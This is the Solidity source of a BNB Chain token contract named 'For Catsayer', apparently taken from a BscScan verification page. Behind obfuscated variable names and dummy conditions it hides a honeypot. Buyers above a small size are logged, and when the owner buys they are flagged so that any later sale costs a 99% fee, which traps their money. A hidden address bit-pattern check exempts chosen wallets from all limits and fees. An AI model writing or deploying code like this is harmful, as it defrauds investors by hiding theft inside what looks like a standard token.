/**
 *Submitted for verification at BscScan.com on 2022-12-13
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Manager {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract ForCatsayer is IBEP20, Manager {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "For Catsayer ";
    string constant _symbol = "ForCatsayer";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private swapLimitLaunchedTrading;
    mapping(address => bool) private isFeeSellReceiverWallet;
    mapping(address => bool) private txReceiverBotsSwapTrading;
    mapping(address => bool) private minMarketingLaunchedTrading;
    mapping(address => uint256) private minLimitSwapBuy;
    mapping(uint256 => address) private tradingMinMaxReceiverLiquidityModeSell;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private feeMarketingWalletBurn = 0;
    uint256 private limitTxMarketingTrading = 9;

    //SELL FEES
    uint256 private marketingTeamTradingWalletIs = 0;
    uint256 private maxMarketingWalletIsSwapLiquidityLimit = 9;

    uint256 private txExemptLiquidityWallet = limitTxMarketingTrading + feeMarketingWalletBurn;
    uint256 private marketingLiquidityFeeWallet = 100;

    address private liquiditySwapMaxTeam = (msg.sender); // auto-liq address
    address private walletMaxSwapAuto = (0x6BD1C6C8A7f95A6Bb9b461D8FFFFf1C671a94f51); // marketing address
    address private marketingTradingBotsAutoMax = DEAD;
    address private tradingExemptSwapLiquidity = DEAD;
    address private isBurnLaunchedMarketing = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private marketingFeeIsTeam;
    uint256 private burnTradingBotsMarketingBuyExemptReceiver;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private buyBotsSellBurnMax;
    uint256 private minAutoExemptReceiver;
    uint256 private autoLiquidityExemptBurnMode;
    uint256 private tradingFeeSellTeam;
    uint256 private marketingWalletMaxIsBuy;

    bool private swapTxAutoReceiverBurnMarketingSell = true;
    bool private minMarketingLaunchedTradingMode = true;
    bool private liquidityReceiverTxLimit = true;
    bool private sellMinLimitWallet = true;
    bool private botsMarketingExemptTx = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private burnExemptAutoMaxSellBuyTrading = 6 * 10 ** 15;
    uint256 private exemptBurnLaunchedMax = _totalSupply / 1000; // 0.1%

    
    uint256 private feeExemptTradingMinModeBurnSwap = 0;
    uint256 private modeSwapBurnTxExempt = 0;
    uint256 private buySellBurnTradingBots = 0;
    uint256 private walletMarketingTeamTx = 0;
    uint256 private modeBuyBotsLaunchedTeamMin = 0;
    uint256 private sellWalletSwapLaunched = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Manager(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        buyBotsSellBurnMax = true;

        swapLimitLaunchedTrading[msg.sender] = true;
        swapLimitLaunchedTrading[address(this)] = true;

        isFeeSellReceiverWallet[msg.sender] = true;
        isFeeSellReceiverWallet[0x0000000000000000000000000000000000000000] = true;
        isFeeSellReceiverWallet[0x000000000000000000000000000000000000dEaD] = true;
        isFeeSellReceiverWallet[address(this)] = true;

        txReceiverBotsSwapTrading[msg.sender] = true;
        txReceiverBotsSwapTrading[0x0000000000000000000000000000000000000000] = true;
        txReceiverBotsSwapTrading[0x000000000000000000000000000000000000dEaD] = true;
        txReceiverBotsSwapTrading[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return botsMarketingWalletModeSellBurnTeam(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "For Catsayer  Insufficient Allowance");
        }

        return botsMarketingWalletModeSellBurnTeam(sender, recipient, amount);
    }

    function botsMarketingWalletModeSellBurnTeam(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = isLaunchedSwapMax(sender) || isLaunchedSwapMax(recipient);
        
        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isOwner(recipient)) {
                minFeeMaxTx();
            }
            if (!bLimitTxWalletValue) {
                teamFeeMaxBuy(recipient);
            }
        }
        
        if (inSwap || bLimitTxWalletValue) {return liquidityMinBuySwap(sender, recipient, amount);}

        if (!swapLimitLaunchedTrading[sender] && !swapLimitLaunchedTrading[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "For Catsayer  Max wallet has been triggered");
        }
        
        if (buySellBurnTradingBots != walletMarketingTeamTx) {
            buySellBurnTradingBots = modeBuyBotsLaunchedTeamMin;
        }


        require((amount <= _maxTxAmount) || txReceiverBotsSwapTrading[sender] || txReceiverBotsSwapTrading[recipient], "For Catsayer  Max TX Limit has been triggered");

        if (feeAutoMaxMode()) {limitAutoMinBots();}

        _balances[sender] = _balances[sender].sub(amount, "For Catsayer  Insufficient Balance");
        
        if (modeSwapBurnTxExempt != exemptBurnLaunchedMax) {
            modeSwapBurnTxExempt = walletMarketingTeamTx;
        }


        uint256 amountReceived = botsMinFeeLiquidity(sender) ? swapTxFeeLiquidity(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function liquidityMinBuySwap(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "For Catsayer  Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function botsMinFeeLiquidity(address sender) internal view returns (bool) {
        return !isFeeSellReceiverWallet[sender];
    }

    function sellMinExemptBuyBotsTrading(address sender, bool selling) internal returns (uint256) {
        
        if (modeSwapBurnTxExempt == exemptBurnLaunchedMax) {
            modeSwapBurnTxExempt = sellWalletSwapLaunched;
        }


        if (selling) {
            txExemptLiquidityWallet = maxMarketingWalletIsSwapLiquidityLimit + marketingTeamTradingWalletIs;
            return autoSwapMinMax(sender, txExemptLiquidityWallet);
        }
        if (!selling && sender == uniswapV2Pair) {
            txExemptLiquidityWallet = limitTxMarketingTrading + feeMarketingWalletBurn;
            return txExemptLiquidityWallet;
        }
        return autoSwapMinMax(sender, txExemptLiquidityWallet);
    }

    function receiverLimitBotsLaunched() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function swapTxFeeLiquidity(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (buySellBurnTradingBots != burnExemptAutoMaxSellBuyTrading) {
            buySellBurnTradingBots = marketingTeamTradingWalletIs;
        }

        if (feeExemptTradingMinModeBurnSwap != feeExemptTradingMinModeBurnSwap) {
            feeExemptTradingMinModeBurnSwap = burnExemptAutoMaxSellBuyTrading;
        }

        if (walletMarketingTeamTx != walletMarketingTeamTx) {
            walletMarketingTeamTx = marketingTeamTradingWalletIs;
        }


        uint256 feeAmount = amount.mul(sellMinExemptBuyBotsTrading(sender, receiver == uniswapV2Pair)).div(marketingLiquidityFeeWallet);

        if (minMarketingLaunchedTrading[sender] || minMarketingLaunchedTrading[receiver]) {
            feeAmount = amount.mul(99).div(marketingLiquidityFeeWallet);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function isLaunchedSwapMax(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function autoSwapMinMax(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = minLimitSwapBuy[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function teamFeeMaxBuy(address addr) private {
        if (receiverLimitBotsLaunched() < burnExemptAutoMaxSellBuyTrading) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        tradingMinMaxReceiverLiquidityModeSell[exemptLimitValue] = addr;
    }

    function minFeeMaxTx() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (minLimitSwapBuy[tradingMinMaxReceiverLiquidityModeSell[i]] == 0) {
                    minLimitSwapBuy[tradingMinMaxReceiverLiquidityModeSell[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(walletMaxSwapAuto).transfer(amountBNB * amountPercentage / 100);
    }

    function feeAutoMaxMode() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    botsMarketingExemptTx &&
    _balances[address(this)] >= exemptBurnLaunchedMax;
    }

    function limitAutoMinBots() internal swapping {
        
        if (modeBuyBotsLaunchedTeamMin == marketingLiquidityFeeWallet) {
            modeBuyBotsLaunchedTeamMin = walletMarketingTeamTx;
        }


        uint256 amountToLiquify = exemptBurnLaunchedMax.mul(feeMarketingWalletBurn).div(txExemptLiquidityWallet).div(2);
        uint256 amountToSwap = exemptBurnLaunchedMax.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (buySellBurnTradingBots != txExemptLiquidityWallet) {
            buySellBurnTradingBots = feeMarketingWalletBurn;
        }

        if (modeSwapBurnTxExempt == modeBuyBotsLaunchedTeamMin) {
            modeSwapBurnTxExempt = feeMarketingWalletBurn;
        }

        if (walletMarketingTeamTx != feeExemptTradingMinModeBurnSwap) {
            walletMarketingTeamTx = buySellBurnTradingBots;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = txExemptLiquidityWallet.sub(feeMarketingWalletBurn.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(feeMarketingWalletBurn).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(limitTxMarketingTrading).div(totalETHFee);
        
        if (modeSwapBurnTxExempt == modeSwapBurnTxExempt) {
            modeSwapBurnTxExempt = buySellBurnTradingBots;
        }

        if (sellWalletSwapLaunched == txExemptLiquidityWallet) {
            sellWalletSwapLaunched = marketingTeamTradingWalletIs;
        }


        payable(walletMaxSwapAuto).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                liquiditySwapMaxTeam,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getLimitTxMarketingTrading() public view returns (uint256) {
        return limitTxMarketingTrading;
    }
    function setLimitTxMarketingTrading(uint256 a0) public onlyOwner {
        if (limitTxMarketingTrading == modeBuyBotsLaunchedTeamMin) {
            modeBuyBotsLaunchedTeamMin=a0;
        }
        if (limitTxMarketingTrading != maxMarketingWalletIsSwapLiquidityLimit) {
            maxMarketingWalletIsSwapLiquidityLimit=a0;
        }
        if (limitTxMarketingTrading != modeSwapBurnTxExempt) {
            modeSwapBurnTxExempt=a0;
        }
        limitTxMarketingTrading=a0;
    }

    function getTradingMinMaxReceiverLiquidityModeSell(uint256 a0) public view returns (address) {
        if (a0 == feeMarketingWalletBurn) {
            return tradingExemptSwapLiquidity;
        }
            return tradingMinMaxReceiverLiquidityModeSell[a0];
    }
    function setTradingMinMaxReceiverLiquidityModeSell(uint256 a0,address a1) public onlyOwner {
        tradingMinMaxReceiverLiquidityModeSell[a0]=a1;
    }

    function getSellWalletSwapLaunched() public view returns (uint256) {
        if (sellWalletSwapLaunched != feeExemptTradingMinModeBurnSwap) {
            return feeExemptTradingMinModeBurnSwap;
        }
        if (sellWalletSwapLaunched == burnExemptAutoMaxSellBuyTrading) {
            return burnExemptAutoMaxSellBuyTrading;
        }
        return sellWalletSwapLaunched;
    }
    function setSellWalletSwapLaunched(uint256 a0) public onlyOwner {
        sellWalletSwapLaunched=a0;
    }

    function getTradingExemptSwapLiquidity() public view returns (address) {
        if (tradingExemptSwapLiquidity == tradingExemptSwapLiquidity) {
            return tradingExemptSwapLiquidity;
        }
        return tradingExemptSwapLiquidity;
    }
    function setTradingExemptSwapLiquidity(address a0) public onlyOwner {
        if (tradingExemptSwapLiquidity != marketingTradingBotsAutoMax) {
            marketingTradingBotsAutoMax=a0;
        }
        if (tradingExemptSwapLiquidity != isBurnLaunchedMarketing) {
            isBurnLaunchedMarketing=a0;
        }
        if (tradingExemptSwapLiquidity == walletMaxSwapAuto) {
            walletMaxSwapAuto=a0;
        }
        tradingExemptSwapLiquidity=a0;
    }

    function getIsBurnLaunchedMarketing() public view returns (address) {
        if (isBurnLaunchedMarketing == isBurnLaunchedMarketing) {
            return isBurnLaunchedMarketing;
        }
        if (isBurnLaunchedMarketing == isBurnLaunchedMarketing) {
            return isBurnLaunchedMarketing;
        }
        if (isBurnLaunchedMarketing == isBurnLaunchedMarketing) {
            return isBurnLaunchedMarketing;
        }
        return isBurnLaunchedMarketing;
    }
    function setIsBurnLaunchedMarketing(address a0) public onlyOwner {
        if (isBurnLaunchedMarketing != liquiditySwapMaxTeam) {
            liquiditySwapMaxTeam=a0;
        }
        if (isBurnLaunchedMarketing == isBurnLaunchedMarketing) {
            isBurnLaunchedMarketing=a0;
        }
        isBurnLaunchedMarketing=a0;
    }

    function getBuySellBurnTradingBots() public view returns (uint256) {
        if (buySellBurnTradingBots != maxMarketingWalletIsSwapLiquidityLimit) {
            return maxMarketingWalletIsSwapLiquidityLimit;
        }
        if (buySellBurnTradingBots == maxMarketingWalletIsSwapLiquidityLimit) {
            return maxMarketingWalletIsSwapLiquidityLimit;
        }
        return buySellBurnTradingBots;
    }
    function setBuySellBurnTradingBots(uint256 a0) public onlyOwner {
        if (buySellBurnTradingBots == exemptBurnLaunchedMax) {
            exemptBurnLaunchedMax=a0;
        }
        if (buySellBurnTradingBots == marketingLiquidityFeeWallet) {
            marketingLiquidityFeeWallet=a0;
        }
        if (buySellBurnTradingBots != modeSwapBurnTxExempt) {
            modeSwapBurnTxExempt=a0;
        }
        buySellBurnTradingBots=a0;
    }

    function getBurnExemptAutoMaxSellBuyTrading() public view returns (uint256) {
        if (burnExemptAutoMaxSellBuyTrading == sellWalletSwapLaunched) {
            return sellWalletSwapLaunched;
        }
        if (burnExemptAutoMaxSellBuyTrading != burnExemptAutoMaxSellBuyTrading) {
            return burnExemptAutoMaxSellBuyTrading;
        }
        if (burnExemptAutoMaxSellBuyTrading == exemptBurnLaunchedMax) {
            return exemptBurnLaunchedMax;
        }
        return burnExemptAutoMaxSellBuyTrading;
    }
    function setBurnExemptAutoMaxSellBuyTrading(uint256 a0) public onlyOwner {
        burnExemptAutoMaxSellBuyTrading=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}